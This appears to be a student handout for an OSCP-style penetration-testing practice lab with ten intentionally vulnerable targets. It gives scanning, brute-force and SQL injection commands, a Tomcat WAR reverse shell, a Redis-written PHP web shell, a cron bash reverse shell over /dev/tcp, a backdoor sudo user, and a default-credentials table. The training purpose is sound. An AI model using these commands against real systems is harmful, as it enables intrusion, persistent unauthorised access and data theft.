# 📚 OSCP Realistic Lab - Student Instructions (10 Targets)

## 🔐 Your Login Credentials

Your instructor will provide you with:
- Your username (oscpuser1, oscpuser2, oscpuser3, or oscpuser4)
- Your password
- Server IP: 155.138.197.128

## 🖥️ Lab Environment - 10 Realistic Targets

### Network Map (172.16.0.0/24)

| IP Address | Hostname | Services | Difficulty |
|------------|----------|----------|------------|
| 172.16.0.11-14 | kali-user1-4 | Your Kali Machines | - |
| 172.16.0.20 | ssh-server | SSH (22) | Easy |
| 172.16.0.30 | dvwa-server | HTTP (80) - DVWA | Easy |
| 172.16.0.40 | ftp-server | FTP (21) | Easy |
| 172.16.0.50 | mysql-server | MySQL (3306) | Medium |
| 172.16.0.60 | smb-server | SMB (139,445) | Easy |
| 172.16.0.70 | tomcat-server | HTTP (8080) - Tomcat | Medium |
| 172.16.0.80 | redis-server | Redis (6379) | Medium |
| 172.16.0.90 | postgres-server | PostgreSQL (5432) | Medium |
| 172.16.0.100 | wordpress-server | HTTP (80) - WordPress | Medium |
| 172.16.0.110 | webgoat-server | HTTP (8080) - WebGoat | Hard |

---

## 🛠️ Required Tools Installation

### IMPORTANT: Install These Tools FIRST!
Once you're in your Kali container, you MUST install these tools before starting the labs:

```bash
# Step 1: Update package lists
apt update

# Step 2: Install essential tools (REQUIRED)
apt install -y \
    nmap \
    netcat-traditional \
    curl \
    wget \
    git \
    vim \
    net-tools \
    iputils-ping \
    dnsutils

# Step 3: Install scanning and enumeration tools
apt install -y \
    gobuster \
    dirb \
    dirbuster \
    nikto \
    enum4linux \
    smbclient \
    smbmap \
    ftp \
    telnet

# Step 4: Install exploitation tools
apt install -y \
    hydra \
    john \
    hashcat \
    sqlmap \
    metasploit-framework \
    exploitdb \
    searchsploit

# Step 5: Install web application tools
apt install -y \
    wfuzz \
    ffuf \
    burpsuite \
    zaproxy \
    wpscan

# Step 6: Install database clients
apt install -y \
    mysql-client \
    postgresql-client \
    redis-tools \
    mongodb-clients

# Step 7: Install additional useful tools
apt install -y \
    python3 \
    python3-pip \
    python3-venv \
    tmux \
    screen \
    socat \
    proxychains \
    tcpdump \
    wireshark

# Step 8: Install Python tools via pip
pip3 install \
    impacket \
    bloodhound \
    crackmapexec \
    ldapdomaindump
```

### Quick One-Liner Installation (Copy & Paste This):
```bash
apt update && apt install -y nmap netcat-traditional curl wget git vim net-tools iputils-ping dnsutils gobuster dirb nikto enum4linux smbclient smbmap ftp telnet hydra john hashcat sqlmap metasploit-framework exploitdb wfuzz ffuf wpscan mysql-client postgresql-client redis-tools python3 python3-pip tmux screen socat proxychains tcpdump
```

### Verify Installation:
```bash
# Check critical tools are installed
which nmap gobuster hydra sqlmap msfconsole
```

---

## Getting Started

### Step 1: Connect to the Server
```bash
ssh oscpuser[YOUR_NUMBER]@155.138.197.128
# Enter your password when prompted
```

### Step 2: Start Your Lab Environment
```bash
./start-lab.sh
# You're now in your Kali container!
```

### Step 3: Install Tools (SEE ABOVE)
```bash
# Run the installation commands from the "Required Tools Installation" section above
# This will take 5-10 minutes - be patient!
```

### Step 4: Verify Everything Works
```bash
# Test network connectivity
ping 172.16.0.20

# Test nmap
nmap --version

# Test metasploit
msfconsole -v
```

---

## 🎯 REALISTIC LAB EXERCISES

## Phase 1: Comprehensive Network Discovery

### Objective: Map the entire network and identify all services

```bash
# 1. Host Discovery - Find all 14 machines
nmap -sn 172.16.0.0/24 -oN host-discovery.txt

# Expected: 4 Kali machines + 10 targets = 14 hosts

# 2. Quick port scan on all targets
nmap -sS -p- --min-rate=1000 172.16.0.20-110 -oN all-ports.txt

# 3. Detailed service scan on discovered ports
nmap -sV -sC -A 172.16.0.20,172.16.0.30,172.16.0.40,172.16.0.50,172.16.0.60,172.16.0.70,172.16.0.80,172.16.0.90,172.16.0.100,172.16.0.110 -oN detailed-scan.txt

# 4. UDP scan (top 20 ports)
nmap -sU --top-ports 20 172.16.0.20-110 -oN udp-scan.txt

# 5. Vulnerability scripts
nmap --script vuln 172.16.0.20-110 -oN vuln-scan.txt
```

**You should discover:**
- SSH on .20 (port 22)
- HTTP on .30, .100 (port 80)
- FTP on .40 (port 21)
- MySQL on .50 (port 3306)
- SMB on .60 (ports 139, 445)
- Tomcat on .70, .110 (port 8080)
- Redis on .80 (port 6379)
- PostgreSQL on .90 (port 5432)

---

## Phase 2: Service Enumeration

### Target 1: SSH Server (172.16.0.20)
```bash
# Check SSH version
nmap -sV -p22 172.16.0.20

# Try weak credentials
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.16.0.20 -t 4

# Default: root:toor
ssh root@172.16.0.20
```

### Target 2: DVWA Web App (172.16.0.30)
```bash
# Web enumeration
nikto -h http://172.16.0.30
gobuster dir -u http://172.16.0.30 -w /usr/share/wordlists/dirb/common.txt

# Default login: admin:password
curl -X POST http://172.16.0.30/login.php -d "username=admin&password=password&Login=Login"

# SQL Injection test
curl "http://172.16.0.30/vulnerabilities/sqli/?id=1' OR '1'='1"
```

### Target 3: FTP Server (172.16.0.40)
```bash
# Check anonymous access
ftp 172.16.0.40
# Username: anonymous
# Password: anonymous

# Using nmap
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor 172.16.0.40
```

### Target 4: MySQL Database (172.16.0.50)
```bash
# Try connection
mysql -h 172.16.0.50 -u root -p
# Password: password123

# Remote enumeration
nmap --script mysql-databases,mysql-empty-password,mysql-enum,mysql-info 172.16.0.50

# Dump databases
mysqldump -h 172.16.0.50 -u root -ppassword123 --all-databases
```

### Target 5: SMB Server (172.16.0.60)
```bash
# Enumerate shares
smbclient -L //172.16.0.60 -N
enum4linux -a 172.16.0.60

# Connect to share
smbclient //172.16.0.60/public -U smbuser
# Password: password123

# Download all files
smbget -R smb://172.16.0.60/public -U smbuser
```

### Target 6: Tomcat Server (172.16.0.70)
```bash
# Check manager app
curl http://172.16.0.70:8080/manager/html -u admin:admin

# Deploy WAR file for shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.0.11 LPORT=4444 -f war > shell.war
curl --upload-file shell.war -u admin:admin "http://172.16.0.70:8080/manager/text/deploy?path=/shell"
```

### Target 7: Redis Server (172.16.0.80)
```bash
# Connect to Redis
redis-cli -h 172.16.0.80
# AUTH redis123

# Get all keys
redis-cli -h 172.16.0.80 -a redis123 --scan

# Check for command execution
redis-cli -h 172.16.0.80 -a redis123 config set dir /tmp/
```

### Target 8: PostgreSQL (172.16.0.90)
```bash
# Connect
psql -h 172.16.0.90 -U postgres
# Password: postgres

# List databases
psql -h 172.16.0.90 -U postgres -c "\l"

# Dump database
pg_dump -h 172.16.0.90 -U postgres testdb > testdb.sql
```

### Target 9: WordPress (172.16.0.100)
```bash
# Scan for vulnerabilities
wpscan --url http://172.16.0.100 --enumerate u,p,t,tt

# Brute force admin
wpscan --url http://172.16.0.100 -U admin -P /usr/share/wordlists/rockyou.txt

# Check for xmlrpc
curl -X POST http://172.16.0.100/xmlrpc.php
```

### Target 10: WebGoat (172.16.0.110)
```bash
# Access WebGoat
curl http://172.16.0.110:8080/WebGoat

# Default: guest:guest
# Practice various web vulnerabilities
```

---

## Phase 3: Exploitation

### Metasploit Framework
```bash
msfconsole

# Database setup
db_status
workspace -a oscp_lab

# Import nmap scans
db_import detailed-scan.txt

# Search for exploits
search type:exploit platform:linux
search tomcat

# Example: Tomcat manager deploy
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.16.0.70
set RPORT 8080
set HttpUsername admin
set HttpPassword admin
set LHOST 172.16.0.11
run
```

### Manual Exploitation
```bash
# SQL Injection to Shell (DVWA)
sqlmap -u "http://172.16.0.30/vulnerabilities/sqli/?id=1" --cookie="PHPSESSID=xxx" --os-shell

# Redis RCE
redis-cli -h 172.16.0.80 -a redis123
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET test "<?php system($_GET['cmd']); ?>"
SAVE

# WordPress plugin upload
# Create malicious plugin, upload via admin panel
```

---

## Phase 4: Post-Exploitation

### Privilege Escalation
```bash
# Linux enumeration
wget http://172.16.0.11:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Check sudo privileges
sudo -l

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Kernel exploits
uname -a
searchsploit linux kernel
```

### Persistence
```bash
# Add SSH key
ssh-keygen -t rsa
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

# Cron job
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.16.0.11/4444 0>&1'" | crontab -

# Create user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor
```

---

## 📝 Lab Completion Checklist

### Network Discovery
- [ ] Found all 14 hosts
- [ ] Identified all services on each target
- [ ] Documented open ports and versions

### Service Enumeration
- [ ] Accessed SSH server
- [ ] Exploited DVWA vulnerabilities
- [ ] Connected to FTP anonymously
- [ ] Accessed MySQL database
- [ ] Enumerated SMB shares
- [ ] Accessed Tomcat manager
- [ ] Connected to Redis
- [ ] Accessed PostgreSQL
- [ ] Scanned WordPress
- [ ] Explored WebGoat

### Exploitation
- [ ] Gained shell on at least 5 targets
- [ ] Used both manual and automated techniques
- [ ] Documented exploitation methods

### Post-Exploitation
- [ ] Escalated privileges on at least 2 systems
- [ ] Established persistence
- [ ] Extracted sensitive data

---

## 💡 Tips for Success

1. **Enumerate Thoroughly**: Don't rush to exploit
2. **Take Notes**: Document every command and result
3. **Try Default Credentials**: Many services use weak passwords
4. **Check All Services**: Some targets have multiple vulnerabilities
5. **Practice Different Techniques**: Manual and automated

---

## 🎯 Default Credentials Reference

| Service | Username | Password |
|---------|----------|----------|
| SSH (172.16.0.20) | root | toor |
| DVWA (172.16.0.30) | admin | password |
| FTP (172.16.0.40) | anonymous | anonymous |
| MySQL (172.16.0.50) | root | password123 |
| SMB (172.16.0.60) | smbuser | password123 |
| Tomcat (172.16.0.70) | admin | admin |
| Redis (172.16.0.80) | - | redis123 |
| PostgreSQL (172.16.0.90) | postgres | postgres |
| WordPress (172.16.0.100) | admin | admin |
| WebGoat (172.16.0.110) | guest | guest |

---

## 🆘 Troubleshooting

### Can't reach targets?
```bash
# Check your IP
ip addr show
# Should be 172.16.0.1X

# Ping test
ping 172.16.0.20
```

### Tools not working?
```bash
# Reinstall
apt update && apt install -y [tool-name]
```

### Tool not found?
```bash
# Search for the package
apt search [tool-name]

# Install if found
apt install -y [package-name]
```

### Need to reset?
```bash
exit  # Exit Kali
exit  # Exit SSH
# Reconnect and start fresh
```

---

## 📚 Tool Reference Guide

### Essential Tools & Their Purpose

| Tool | Purpose | Example Usage |
|------|---------|--------------|
| **nmap** | Network/port scanning | `nmap -sV -sC 172.16.0.20` |
| **gobuster** | Directory/file enumeration | `gobuster dir -u http://172.16.0.30 -w /usr/share/wordlists/dirb/common.txt` |
| **hydra** | Password brute forcing | `hydra -l admin -P pass.txt ssh://172.16.0.20` |
| **sqlmap** | SQL injection automation | `sqlmap -u "http://172.16.0.30/page?id=1" --dump` |
| **metasploit** | Exploitation framework | `msfconsole` then `search [vulnerability]` |
| **nikto** | Web vulnerability scanner | `nikto -h http://172.16.0.30` |
| **enum4linux** | SMB enumeration | `enum4linux -a 172.16.0.60` |
| **smbclient** | SMB share access | `smbclient //172.16.0.60/share -N` |
| **wpscan** | WordPress scanner | `wpscan --url http://172.16.0.100` |
| **wfuzz** | Web fuzzing | `wfuzz -c -z file,wordlist.txt http://172.16.0.30/FUZZ` |
| **john** | Password hash cracking | `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
| **hashcat** | Advanced hash cracking | `hashcat -m 0 hash.txt wordlist.txt` |
| **searchsploit** | Exploit database search | `searchsploit apache 2.4` |
| **redis-cli** | Redis client | `redis-cli -h 172.16.0.80` |
| **mysql** | MySQL client | `mysql -h 172.16.0.50 -u root -p` |
| **psql** | PostgreSQL client | `psql -h 172.16.0.90 -U postgres` |
| **netcat** | Network utility/shells | `nc -lvnp 4444` |
| **tmux** | Terminal multiplexer | `tmux new -s session` |
| **impacket** | Windows attack tools | `impacket-smbexec` |

### Wordlist Locations
```bash
/usr/share/wordlists/rockyou.txt       # Common passwords
/usr/share/wordlists/dirb/common.txt   # Common directories
/usr/share/wordlists/dirbuster/        # More directories
/usr/share/seclists/                   # SecLists (if installed)
```

### Useful Aliases to Add
```bash
# Add these to ~/.bashrc for shortcuts
echo "alias ll='ls -la'" >> ~/.bashrc
echo "alias ports='netstat -tulan'" >> ~/.bashrc
echo "alias myip='ip addr show eth0'" >> ~/.bashrc
echo "alias scan='nmap -sV -sC'" >> ~/.bashrc
source ~/.bashrc
```

---

## 🎓 Remember

1. **Install tools BEFORE starting labs** - This saves time and frustration
2. **Use tmux or screen** - Don't lose your work if connection drops
3. **Take screenshots** - Evidence for your practice report
4. **Document everything** - Commands, outputs, successes, failures
5. **Practice methodology** - Enumerate → Exploit → Escalate → Document

---

## Good luck with your realistic OSCP practice! 🎯